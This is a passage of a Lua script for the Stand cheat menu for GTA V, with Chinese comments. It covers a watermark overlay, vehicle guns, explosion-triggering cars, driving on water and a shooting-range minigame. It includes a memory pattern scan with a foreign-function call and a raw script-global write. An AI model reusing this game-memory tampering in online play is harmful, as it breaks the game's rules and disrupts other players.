    watermark_pos.x = x_ / 10000
end
function watermark_y(y_)
    watermark_pos.y = y_ / 10000
end
function watermark_bgx(x_)
    watermark_settings.add_x = x_ / 10000
end
function watermark_bgy(y_)
    watermark_settings.add_y = y_ / 10000
end
function watermark_bgc(col)
    watermark_settings.bg_color = col
end
function watermark_txtc(col)
    watermark_settings.tx_color = col
end
function watermark_lable(val)
    watermark_settings.show_firstl = val
end
function watermark_name(val)
    watermark_settings.show_name = val
end
function watermark_players(val)
    watermark_settings.show_players = val
end
function watermark_time(val)
    watermark_settings.show_date = val
end
function watermark_toggle()
    local wm_text = (
        watermark_settings.show_firstl == 2 and 'Sakura' 
        or watermark_settings.show_firstl == 5 and '^_-' 
        or watermark_settings.show_firstl == 6 and 'OwO' 
        or watermark_settings.show_firstl == 4 and 'Stand' 
        or watermark_settings.show_firstl == 3 and stand_version.editions[stand_version.edition+1] 
        or '') .. (watermark_settings.show_name and ' | '.. players.get_name(PLAYER.PLAYER_ID()) 
        or '') .. (watermark_settings.show_players and NETWORK.NETWORK_IS_SESSION_STARTED() and ' | Players: '..#players.list(true, true, true) 
        or '') .. (watermark_settings.show_date and os.date(' | %H:%M:%S ') 
        or '')

    local tx_size = directx.get_text_size(wm_text, 0.52)

    directx.draw_rect(
        watermark_pos.x + watermark_settings.add_x * 0.5, 
        watermark_pos.y, 
        -(tx_size + 0.0105 + watermark_settings.add_x),  -- add watermark size
        0.025 + watermark_settings.add_y, 
        watermark_settings.bg_color
    )
    directx.draw_texture(icon, 
        0.0055, 
        0.0055, 
        0.5, 
        0.5, 
        watermark_pos.x - tx_size - 0.0055, 
        watermark_pos.y + 0.013, 
        0, 
        {["r"] = 1.0,["g"] = 1.0,["b"] = 1.0,["a"] = 1.0}
    )
    directx.draw_text(
        watermark_pos.x, 
        watermark_pos.y + 0.004, 
        wm_text, 
        ALIGN_TOP_RIGHT, 
        0.5, 
        watermark_settings.tx_color, 
        false
    )
end





------胡桃
function SET_OUTFIT_VALUE(ValueName, Value, variation)
    local commandName = ValueName
    if variation == true then
        commandName = commandName.."var"
    end
    menu.trigger_commands(commandName.." "..Value)
end
function become_walnuts()
    menu.trigger_commands("mpmale")
    SET_OUTFIT_VALUE("head", 32)
    SET_OUTFIT_VALUE("head", 0, true)
    SET_OUTFIT_VALUE("mask", 215)
    SET_OUTFIT_VALUE("mask", 0, true)
    SET_OUTFIT_VALUE("hair", 0)
    SET_OUTFIT_VALUE("hair", 58, true)
    SET_OUTFIT_VALUE("top", 446)
    SET_OUTFIT_VALUE("top", 0, true)
    SET_OUTFIT_VALUE("gloves", 0)
    SET_OUTFIT_VALUE("gloves", 0, true)
    SET_OUTFIT_VALUE("top2", -1)
    SET_OUTFIT_VALUE("top2", 0, true)
    SET_OUTFIT_VALUE("top3", -1)
    SET_OUTFIT_VALUE("top3", 0, true)
    SET_OUTFIT_VALUE("parachute", 0)
    SET_OUTFIT_VALUE("parachute", 0, true)
    SET_OUTFIT_VALUE("pants", 160)
    SET_OUTFIT_VALUE("pants", 0, true)
    SET_OUTFIT_VALUE("shoes", 119)
    menu.trigger_commands("feetvar 0")
    SET_OUTFIT_VALUE("accessories", -1)
    SET_OUTFIT_VALUE("accessories", 0, true)
    SET_OUTFIT_VALUE("decals", -1)
    SET_OUTFIT_VALUE("decals", 0, true)
    SET_OUTFIT_VALUE("hat", 193)
    SET_OUTFIT_VALUE("hat", 0, true)
    SET_OUTFIT_VALUE("glasses", -1)
    SET_OUTFIT_VALUE("glasses", -1, true)
    SET_OUTFIT_VALUE("ears", -1)
    SET_OUTFIT_VALUE("ears", -1, true)
    SET_OUTFIT_VALUE("watch", -1)
    SET_OUTFIT_VALUE("watch", -1, true)
    SET_OUTFIT_VALUE("bracelet", -1)
    SET_OUTFIT_VALUE("bracelet", -1, true)
end





-------水上空中驾驶
function on_user_change_vehicle(vehicle)
    if vehicle ~= 0 then
    end
end
local last_car = 0
function all_drive_style()
    local player_cur_car = entities.get_user_vehicle_as_handle()
    if last_car ~= player_cur_car and player_cur_car ~= 0 then 
        on_user_change_vehicle(player_cur_car)
        last_car = player_cur_car
    end
    if renderscorched then
        if player_cur_car ~= 0 then
            ENTITY.SET_ENTITY_RENDER_SCORCHED(player_cur_car, true)
        end
    end

    if walkonwater or driveonwater or driveonair then
        if dow_block == 0 or not ENTITY.DOES_ENTITY_EXIST(dow_block) then
            local hash = util.joaat("stt_prop_stunt_bblock_mdm3")
            request_model(hash)
            local c = {x = 0, y = 0, z = 0}
            dow_block = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, c['x'], c['y'], c['z'], true, false, false)
            ENTITY.SET_ENTITY_ALPHA(dow_block, 0)
            ENTITY.SET_ENTITY_VISIBLE(dow_block, false, 0)
        end
    end
    if dow_block ~= 0 and not walkonwater and not driveonwater and not driveonair then
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, 0, 0, 0, false, false, false)
    end
    if walkonwater then
        vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0.0, 2.0, 0.0)
        -- we need to offset this because otherwise the player keeps diving off the thing, like a fucking dumbass
        -- ht isnt actually used here, but im allocating some memory anyways to prevent a possible crash, probably. idk im no computer engineer
        local ht = memory.alloc(4)
        -- this is better than ENTITY.IS_ENTITY_IN_WATER because it can detect if a player is actually above water without them even being "in" it
        if WATER.GET_WATER_HEIGHT(pos['x'], pos['y'], pos['z'], ht) then
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], memory.read_float(ht), false, false, false)
            ENTITY.SET_ENTITY_HEADING(dow_block, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
        end
    end
    if driveonwater then
        if player_cur_car ~= 0 then
            local pos = ENTITY.GET_ENTITY_COORDS(player_cur_car, true)
            -- ht isnt actually used here, but im allocating some memory anyways to prevent a possible crash, probably. idk im no computer engineer
            local ht = memory.alloc(4)
            -- this is better than ENTITY.IS_ENTITY_IN_WATER because it can detect if a player is actually above water without them even being "in" it
            if WATER.GET_WATER_HEIGHT(pos['x'], pos['y'], pos['z'], ht) then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], memory.read_float(ht), false, false, false)
                ENTITY.SET_ENTITY_HEADING(dow_block, ENTITY.GET_ENTITY_HEADING(player_cur_car))
            end
        else
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, 0, 0, 0, false, false, false)
        end
    end
    if driveonair then
        if player_cur_car ~= 0 then
            local pos = ENTITY.GET_ENTITY_COORDS(player_cur_car, true)
            local box_pos = ENTITY.GET_ENTITY_COORDS(dow_block, true)
            if Get_distance(pos, box_pos, true) >= 5 then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], doa_ht, false, false, false)
                ENTITY.SET_ENTITY_HEADING(dow_block, ENTITY.GET_ENTITY_HEADING(car_hdl))
            end
            if PAD.IS_CONTROL_PRESSED(0, 22) then
                doa_ht = doa_ht + 0.1
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], doa_ht, false, false, false)
                ENTITY.SET_ENTITY_COORDS(player_cur_car, pos['x'], pos['y'], doa_ht + 1, false, false, false)
                ENTITY.SET_ENTITY_HEADING(dow_block, ENTITY.GET_ENTITY_HEADING(car_hdl) )
            end
            if PAD.IS_CONTROL_PRESSED(0, 36) then
                doa_ht = doa_ht - 0.1
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], doa_ht, false, false, false)
                ENTITY.SET_ENTITY_COORDS(player_cur_car, pos['x'], pos['y'], doa_ht + 1, false, false, false)
                ENTITY.SET_ENTITY_HEADING(dow_block, ENTITY.GET_ENTITY_HEADING(car_hdl))
            end
        end
    end  
end


-------先进追踪导弹
function memoryScan(name, pattern, callback)
	local address = memory.scan(pattern)
	assert(address ~= NULL, "内存扫描失败： " .. name)
	callback(address)
end
memoryScan("GetNetGamePlayer", "48 83 EC ? 33 C0 38 05 ? ? ? ? 74 ? 83 F9", function (address)
	GetNetGamePlayer_addr = address
end)
function GetNetGamePlayer(player)
	return util.call_foreign_function(GetNetGamePlayer_addr, player)
end


--------载具武器
function get_vehicle_cam_relative_heading(vehicle)
	local camDir = CAM.GET_GAMEPLAY_CAM_ROT(0):toDir()
	local fwdVector = ENTITY.GET_ENTITY_FORWARD_VECTOR(vehicle)
	camDir.z, fwdVector.z = 0.0, 0.0
	local angle = math.acos(fwdVector:dot(camDir) / (#camDir * #fwdVector))
	return math.deg(angle)
end
function shoot_from_vehicle(vehicle, damage, weaponHash, ownerPed, isAudible, isVisible, speed, target, position)
	local min, max = v3.new(), v3.new()
	local offset
	MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), min, max)
	if position == 0 then
		offset = v3.new(min.x, max.y + 0.25, 0.3)
	elseif position == 1 then
		offset = v3.new(min.x, min.y, 0.3)
	elseif position == 2 then
		offset = v3.new(max.x, max.y + 0.25, 0.3)
	elseif position == 3 then
		offset = v3.new(max.x, min.y, 0.3)
	else
		error("得到了意想不到的位置")
	end
	local a = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, offset.x, offset.y, offset.z)
	local direction = ENTITY.GET_ENTITY_ROTATION(vehicle, 2):toDir()
	if get_vehicle_cam_relative_heading(vehicle) > 95.0 then
		direction:mul(-1)
	end
	local b = v3.new(direction)
	b:mul(300.0); b:add(a)

	MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY_NEW(a.x, a.y, a.z,b.x, b.y, b.z,damage,true,weaponHash,ownerPed,isAudible,not isVisible,speed,vehicle,false, false, target, false, 0, 0, 0)
end
function vehlaser()
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), false) then
		local vehicle = get_vehicle_player_is_in(PLAYER.PLAYER_ID())
		local min, max = v3.new(), v3.new()
		MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), min, max)
		local startLeft = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle,  min.x, max.y, 0.0)
		local endLeft = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, min.x, max.y + 25.0, 0.0)
		GRAPHICS.DRAW_LINE(startLeft.x, startLeft.y, startLeft.z, endLeft.x, endLeft.y, endLeft.z, 255, 0, 0, 150)

		local startRight = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, max.x, max.y, 0.0)
		local endRight = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, max.x, max.y + 25.0, 0)
		GRAPHICS.DRAW_LINE(startRight.x, startRight.y, startRight.z, endRight.x, endRight.y, endRight.z, 255, 0, 0, 150)
	end
end
VehicleWeapon = {modelName = "", timeBetweenShots = 0}
VehicleWeapon.__index = VehicleWeapon
function VehicleWeapon.new(modelName, timeBetweenShots)
	local instance = setmetatable({}, VehicleWeapon)
	instance.modelName = modelName
	instance.timeBetweenShots = timeBetweenShots
	return instance
end
vehicleWeaponList = {
	VehicleWeapon.new("weapon_vehicle_rocket", 220),
	VehicleWeapon.new("weapon_raypistol", 50),
	VehicleWeapon.new("weapon_firework", 220),
	VehicleWeapon.new("vehicle_weapon_tank", 220),
	VehicleWeapon.new("vehicle_weapon_player_lazer", 30)
}
Imputs_vehweapon = {
	INPUT_JUMP = {"Spacebar; X", 22},
	INPUT_VEH_ATTACK = {"Mouse L; RB", 69},
	INPUT_VEH_AIM = {"Mouse R; LB", 68},
	INPUT_VEH_DUCK = {"X; A", 73},
	INPUT_VEH_HORN = {"E; L3", 86},
	INPUT_VEH_CINEMATIC_UP_ONLY = {"Numpad +; none", 96},
	INPUT_VEH_CINEMATIC_DOWN_ONLY = {"Numpad -; none", 97}
}
trans_plane = {
	AirstrikeAircraft = "按 ~%s~ 以使用空袭飞机",
	Keyboard = "键盘",
	Controller = "手柄",
	VehicleWeapons = "按 ~%s~ 使用载具武器"
}

local Vw_state = 0
local Vw_selectedOpt = 1
local msg = "按 ~%s~ 使用载具武器"
function vehweapon_veh()
    local control = funConfig.controls.vehicleweapons
	if Vw_state == 0 or timer.elapsed() > 120000 then
		local controlName = table.find_if(Imputs_vehweapon, function(k, tbl)
			return tbl[2] == control
		end)
		assert(controlName, "未找到控件名称")
		util.show_corner_help(msg:format(controlName))
		Vw_state = 1
		timer.reset()
	end
	local selectedWeapon = vehicleWeaponList[Vw_selectedOpt]
	local vehicle = get_vehicle_player_is_in(PLAYER.PLAYER_ID())
	local weaponHash = util.joaat(selectedWeapon.modelName)
	request_weapon_asset(weaponHash)
	if not ENTITY.DOES_ENTITY_EXIST(vehicle) or not PAD.IS_CONTROL_PRESSED(0, control) or
	timer.elapsed() < selectedWeapon.timeBetweenShots then
		return
	elseif get_vehicle_cam_relative_heading(vehicle) < 95.0 then
		shoot_from_vehicle(vehicle, 200, weaponHash, PLAYER.PLAYER_PED_ID(), true, true, 2000.0, 0, 0)
		shoot_from_vehicle(vehicle, 200, weaponHash, PLAYER.PLAYER_PED_ID(), true, true, 2000.0, 0, 2)
		timer.reset()
	else
		shoot_from_vehicle(vehicle, 200, weaponHash, PLAYER.PLAYER_PED_ID(), true, true, 2000.0, 0, 1)
		shoot_from_vehicle(vehicle, 200, weaponHash, PLAYER.PLAYER_PED_ID(), true, true, 2000.0, 0, 3)
		timer.reset()
	end
end
function setvehweapon(index, menu_name, prev_value, click_type)
    Vw_selectedOpt = index 
end




----魔幻激光战马
local Lsdcar
local lsdh = {'weapon_raycarbine','weapon_raypistol'}
local Lsdcar_hash = 'weapon_raycarbine'
function Magic_Warhorse_W(vweap)
    Lsdcar_hash = lsdh[vweap]
end
function shoot_from_vehicle_Lazer_Space_Car(vehicle, damage, weaponHash, ownerPed, isAudible, isVisible, speed, target, position)
    local min, max = v3.new(), v3.new()
    local offset
    MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), min, max)
    if position == 0 then
        offset = v3.new(min.x + 0.3, max.y + 0.25, 0.5)
    elseif position == 1 then
        offset = v3.new(min.x + 0.3, min.y + 4, 0.5)
    elseif position == 2 then
        offset = v3.new(max.x - 0.3, max.y + 0.25, 0.5)
    elseif position == 3 then
        offset = v3.new(max.x - 0.3, min.y + 4, 0.5)
    else
        error("got unexpected position")
    end
    local a = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, offset.x, offset.y - 3.15, offset.z + 1.05)
    local direction = ENTITY.GET_ENTITY_ROTATION(vehicle, 2):toDir()
    local b = v3.new(direction)
    b:mul(300.0); b:add(a)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY_NEW(a.x, a.y, a.z,b.x, b.y, b.z - 15,damage,true,weaponHash,ownerPed,isAudible,not isVisible,speed,vehicle,false, false, target, false, 0, 0, 0)
end
function Lazer_Space_Car(toggled)
    Lazer_Space_Car_toggled = toggled
    if Lazer_Space_Car_toggled then
        local vhash = util.joaat('dune2')
        local pCoor = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
        request_model(vhash)
        Lsdcar = VEHICLE.CREATE_VEHICLE(vhash, pCoor.x, pCoor.y, pCoor.z, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()), true, true, false)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), Lsdcar, -1)
    else
        delete_entity(Lsdcar)
    end
    while Lazer_Space_Car_toggled do
        if PED.IS_PED_IN_VEHICLE(PLAYER.PLAYER_PED_ID(), Lsdcar, false) then
            display_buttons({{0, 86, '镭射'}})
            if PAD.IS_CONTROL_PRESSED(0, 86) then
                local weap = util.joaat(Lsdcar_hash)
                request_weapon_asset(weap)
                shoot_from_vehicle_Lazer_Space_Car(Lsdcar, 200, weap, PLAYER.PLAYER_PED_ID(), true, true, 2000.0, 0, 0)
                shoot_from_vehicle_Lazer_Space_Car(Lsdcar, 200, weap, PLAYER.PLAYER_PED_ID(), true, true, 2000.0, 0, 2)
            end
        end
        util.yield()
    end
end




----道奇战马
function SF_ff9()
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(6)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(7)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(8)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(9)
    memory.write_int(memory.script_global(1645739+1121), 1)
    sf.CLEAR_ALL()
    sf.TOGGLE_MOUSE_BUTTONS(false)
    sf.SET_DATA_SLOT(0,PAD2.GET_CONTROL_INSTRUCTIONAL_BUTTON(0, 86, true), '电磁脉冲')
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

magtf = {true, false}
maglist = {{1,'推开'}, {2,'爆炸'}}
magval_style = true
function daoqizhanma_style(magint, menu_name, prev_value, click_type)
    magval_style = magtf[magint]
end
charger = {charg = util.joaat('dukes2'),emp = util.joaat('hei_prop_heist_emp')}
function Ccreate(pCoor, pedSi)
    FFchar = VEHICLE.CREATE_VEHICLE(charger.charg, pCoor.x, pCoor.y, pCoor.z, 0, true, true, false)
    PED.SET_PED_INTO_VEHICLE(pedSi, FFchar, -1)
    VEHICLE.SET_VEHICLE_COLOURS(FFchar, 118, 0)
        for M=0, 49 do
            local modn = VEHICLE.GET_NUM_VEHICLE_MODS(FFchar, M)
            VEHICLE.SET_VEHICLE_MOD(FFchar, M, modn -1, false)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(FFchar, 'MOPAR')
            VEHICLE.GET_VEHICLE_MOD_KIT(FFchar, 0)
            VEHICLE.SET_VEHICLE_MOD_KIT(FFchar, 0)
            VEHICLE.SET_VEHICLE_MOD(FFchar, 14, 0)
            VEHICLE.TOGGLE_VEHICLE_MOD(FFchar, 22, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(FFchar, 18, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(FFchar, 20, true)
            VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(FFchar, 0, 0, 0)
            VEHICLE.SET_VEHICLE_WHEEL_TYPE(FFchar, 7)
            VEHICLE.SET_VEHICLE_MOD(FFchar, 23, 26)
            VEHICLE.SET_VEHICLE_MAX_SPEED(FFchar, 100)
            VEHICLE.MODIFY_VEHICLE_TOP_SPEED(FFchar, 40)
            VEHICLE.SET_VEHICLE_BURNOUT(FFchar, false)
        end
        util.yield(150)
    local ccoor = ENTITY.GET_ENTITY_COORDS(FFchar)
        Empa = OBJECT.CREATE_OBJECT(charger.emp, ccoor.x, ccoor.y -1, ccoor.z -1, true, true, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Empa, FFchar, 0, 0.0, -2.0, 0.5, 0.0, 0.0, 0.0, false, true, false, false, 0, true, 0)
        local CV = CAM.GET_GAMEPLAY_CAM_RELATIVE_HEADING()
        ENTITY.SET_ENTITY_HEADING(FFchar, CV)
        util.yield()
    function Magout()
        if  PAD.IS_CONTROL_PRESSED(0, 86) then
            local car = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
            FIRE.ADD_EXPLOSION(car.x, car.y, car.z, 81, 5000.0, false, true, 0.0, magval_style)
        end
        util.yield()
    end
        util.create_tick_handler(function ()
            if PED.IS_PED_IN_VEHICLE(PLAYER.PLAYER_PED_ID(), FFchar, false) ==true then
                VEHICLE.SET_VEHICLE_DIRT_LEVEL(FFchar, 0)
                ENTITY.SET_ENTITY_INVINCIBLE(FFchar, true)
                VEHICLE.SET_VEHICLE_CAN_BE_VISIBLY_DAMAGED(FFchar, false)
                SF_ff9()
            end
        end)
end
function daoqizhanma()
    request_model(charger.charg)
    request_model(charger.emp)
    local pedSi = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local pCoor = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local pH = ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID())

    if players.is_in_interior(PLAYER.PLAYER_ID()) ==true then
        util.toast('无法在室内生成道奇战马')
        menu.set_value(Spawn, false)
        return
    end
    if PED.IS_PED_IN_VEHICLE(PLAYER.PLAYER_PED_ID(), FFchar, true) == false and PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID()) == true then
        local curcar = entities.get_user_vehicle_as_handle()
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(curcar)
        delete_entity(curcar)
        util.toast('已为您更换新的')
        Ccreate(pCoor, pedSi)
    elseif PED.IS_PED_IN_VEHICLE(PLAYER.PLAYER_PED_ID(), FFchar, true) ==true then
        Magout()
    elseif PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID()) == false then
        Ccreate(pCoor, pedSi)
    end
    if PED.IS_PED_GETTING_INTO_A_VEHICLE(PLAYER.PLAYER_PED_ID()) ==false and PED.IS_PED_IN_VEHICLE(PLAYER.PLAYER_PED_ID(), FFchar , false) ==false then
        util.toast('已离开战马,战马已被删除')
        menu.set_value(Spawn, false)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(FFchar)
        delete_entity(FFchar)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Empa)
        delete_entity(Empa)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(charger.charg)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(charger.emp)
        util.stop_thread()
    end
end
function stop_daoqizhanma()
    if FFchar or Empa then
        delete_entity(FFchar)
        delete_entity(Empa)
    end
end
--------------------------------------











------------射击馆
local shoot_text_colour = {
    r = 1.0,
    g = 1.0,
    b = 1.0,
    a = 1.0
}
local shoot_bg_colour = {
    r = 0.75,
    g = 0.82,
    b = 0.94,
    a = 1
}
local shoot_pos = {
    x = -2983.3865,
    y = -5147.500,
    z = 437.15488
}
time_selector ={
    display_options = {{1,"无限制"}, {2,"30s"}, {3,"60s"}, {4,"90s"}, {5,"120s"}, {6,"180s"}, {7,"300s"}},
    value = { 0, 30000, 60000, 90000, 120000, 180000, 300000}
}
local shoot_max_height = 5
simple3d_target_max_height = {
    display_options = {{1,"地面"}, {2,"低"}, {3,"中"}, {4,"高"}, {5,"巅峰"}},
    height_value = {0, 3, 5, 7, 9}
}
local ped_health = 200
ped_health_selector = {
    display_options = {{1,"NPC"}, {2,"Player"}, {3,"一枪击杀"}, {4,"仅爆头[狙击手MKII]"}},
    healh_values = {200, 328, 105, 100000}
}
function clear_all_peds()
    for _, ped in ipairs(entities.get_all_peds_as_handles()) do
        if ped ~= PLAYER.PLAYER_PED_ID() and not PED.IS_PED_A_PLAYER(ped) then
            delete_entity(ped)
        end
    end
end
function clear_dead_peds()
    for _, ped in ipairs(entities.get_all_peds_as_handles()) do
        if ped ~= PLAYER.PLAYER_PED_ID() and not PED.IS_PED_A_PLAYER(ped) and ENTITY.IS_ENTITY_DEAD(ped) then
            delete_entity(ped)
        end               
    end
end

----允许PED移动
local Allow_target_move = false
function target_move(toggle)
    Allow_target_move = toggle
end
function create_ped_simple_3d(max_height, health)
    if max_height ~= 0 then
        zrandom = math.random(0, max_height)
    else
        zrandom = 0
    end
    xrandom, yrandom = math.random(0, 63), math.random(0, 82)
    target_ped = PED.CREATE_RANDOM_PED(-2951.51345-xrandom, -5188.895345+yrandom, 437.353345+zrandom)
    --新增
    if Allow_target_move == true then
        local target_ped2 = PED.CREATE_RANDOM_PED(-2951.51345-math.random(0, 63), -5188.895345+math.random(0, 82), 437.353345+zrandom)
        ENTITY.SET_ENTITY_ALPHA(target_ped2, 0, false)
        ENTITY.SET_ENTITY_HEALTH(target_ped, health, 0)
        TASK.TASK_COMBAT_PED(target_ped, target_ped2, 0, 16)
    else--原
        ENTITY.SET_ENTITY_HEALTH(target_ped, health, 0)
        ENTITY.FREEZE_ENTITY_POSITION(target_ped, true)
    end
    return target_ped
end
function create_ped_simple_2d(health)
    xrandom, yrandom, zrandom = math.random(0, 63), 0, math.random(0, 10)
    target_ped = PED.CREATE_RANDOM_PED(-2951.51345-xrandom, -5188.895345+yrandom, 437.353345+zrandom)
    ENTITY.SET_ENTITY_HEALTH(target_ped, health, 0)
    ENTITY.FREEZE_ENTITY_POSITION(target_ped, true)
    return target_ped
end
function teleport_to_lab()
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), shoot_pos.x, shoot_pos.y+20, shoot_pos.z + 2, 0, 0, 1)
end
function toint(n)
    local s = tostring(n)
    local i, j = s:find('%.')
    if i then
        return tonumber(s:sub(1, i-1))
    else
        return n
    end
end
function end_minigame(minigame)
    minigame:trigger(false)
    util.yield(1000)
    clear_all_peds() 
end
---------创建训练场
local trainobjects = {}
function load_lab()
    local prop_hash = util.joaat("stt_prop_stunt_bblock_huge_03")
    local ped_shoot_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
    request_model(prop_hash)
	
    trainobjects[1] = OBJECT.CREATE_OBJECT_NO_OFFSET(prop_hash, shoot_pos.x, shoot_pos.y, shoot_pos.z, true, true, false)
    trainobjects[2] = OBJECT.CREATE_OBJECT_NO_OFFSET(prop_hash, shoot_pos.x, shoot_pos.y, shoot_pos.z+ 15, true, true, false)
    trainobjects[3] = OBJECT.CREATE_OBJECT_NO_OFFSET(prop_hash, shoot_pos.x, shoot_pos.y+42, shoot_pos.z-2.6, true, true, false)
    trainobjects[4] = OBJECT.CREATE_OBJECT_NO_OFFSET(prop_hash, shoot_pos.x, shoot_pos.y-42, shoot_pos.z-2.6, true, true, false)
    trainobjects[5] = OBJECT.CREATE_OBJECT_NO_OFFSET(prop_hash, shoot_pos.x -32.5, shoot_pos.y, shoot_pos.z, true, true, false)
    trainobjects[6] = OBJECT.CREATE_OBJECT_NO_OFFSET(prop_hash, shoot_pos.x +32.5, shoot_pos.y, shoot_pos.z, true, true, false)

    util.yield(50)
    local rot = ENTITY.GET_ENTITY_ROTATION(trainobjects[3], 0)
    rot.x = 90
	ENTITY.SET_ENTITY_ROTATION(trainobjects[3], rot.x,rot.y,rot.z,1,true)
    rot = ENTITY.GET_ENTITY_ROTATION(trainobjects[4], 0)
    rot.x = 90
	ENTITY.SET_ENTITY_ROTATION(trainobjects[4], rot.x,rot.y,rot.z,1,true)
    rot = ENTITY.GET_ENTITY_ROTATION(trainobjects[5], 0)
    rot.y = 90
	ENTITY.SET_ENTITY_ROTATION(trainobjects[5], rot.x,rot.y,rot.z,1,true)
    rot = ENTITY.GET_ENTITY_ROTATION(trainobjects[6], 0)
    rot.y = -90
	ENTITY.SET_ENTITY_ROTATION(trainobjects[6], rot.x,rot.y,rot.z,1,true)
    util.yield(500)
    teleport_to_lab()
    clear_all_peds()
end
----结束
function Clean_training_ground()
    teleport(-1314, -3057, 13, false)
    util.yield(500)
        for _, ped in ipairs(entities.get_all_peds_as_handles()) do
            if ped ~= PLAYER.PLAYER_PED_ID() and not PED.IS_PED_A_PLAYER(ped) then
                delete_entity(ped)
            end
        end
        for key, value in pairs(trainobjects) do
            delete_entity(value)
        end
end
--------3D射击
ped_health_3d = ped_health
local time_3d = 0
function Shooting_simulation_3D(toggle)
    on = toggle
    ped_health_3d = ped_health_3d
    simple_3d_started = true
    simple_2d_toggle:trigger(false)
    time = time_3d
    menu.trigger_commands("time 11; locktime on")
    util.yield(1000)
    clear_all_peds()
    util.yield(100)
    local target_ped = create_ped_simple_3d(shoot_max_height, ped_health_3d)
    HUD.ADD_BLIP_FOR_ENTITY(target_ped)
    local kills = 0
    local end_time = util.current_time_millis() + time
    while on do
        if Allow_target_move == false then--新增
            TASK.TASK_STAND_STILL(target_ped, 1000000)
        end
        -----DRAW INFO BOX
        local cur_time = util.current_time_millis()
        local timer = ((end_time - cur_time)/1000)
        if time > 0 then
            txt = ("得分: "..kills.." | 时间: "..toint(timer))
        else
            txt = ("得分: "..kills.." | 时间: ∞")
        end
        local size_x, size_y = directx.get_text_size((txt), 0.7)
        local shoot_pos_x = (0.5 - size_x/2)
        local shoot_pos_y = 0.015
        directx.draw_rect(shoot_pos_x - 0.01, shoot_pos_y - 0.01, size_x + 0.02, size_y + 0.02, shoot_bg_colour)
        directx.draw_text(shoot_pos_x, shoot_pos_y, txt, 0, 0.70, shoot_text_colour, true ) 
        if timer <= 0 and time > 0 then
            util.toast("3D射击已经结束 | 得分: "..kills.." | 时间: "..toint(time/1000).."s.")
            simple_3d_started = false
            end_minigame(simple_3d_toggle)
        end
        ------TARGET HANDLER
        if ENTITY.IS_ENTITY_DEAD(target_ped) then
            clear_dead_peds()
            if timer > 0 or time == 0 then
                kills = kills + 1
                target_ped = create_ped_simple_3d(shoot_max_height, ped_health_3d)
                HUD.ADD_BLIP_FOR_ENTITY(target_ped)
            end
        end
        util.yield()
    end
    if not on then 
        clear_all_peds()
        simple_3d_started = false
    end
end
function Set_condition_3D(index)
    ped_health_3d = ped_health_selector.healh_values[index]
    if simple_3d_started then
        util.toast("将设定状况修改为>"..ped_health_selector.display_options[index][2].."< 更改将应用于下一场比赛")
    else
        util.toast("将设定状况修改为>"..ped_health_selector.display_options[index][2].."<")
    end
end
function Set_shoot_time_3D(index)
    time_3d = time_selector.value[index]
    if simple_3d_started then
        util.toast("修改游戏时间至>"..time_selector.display_options[index][2].."< 更改将应用于下一场比赛")
    else
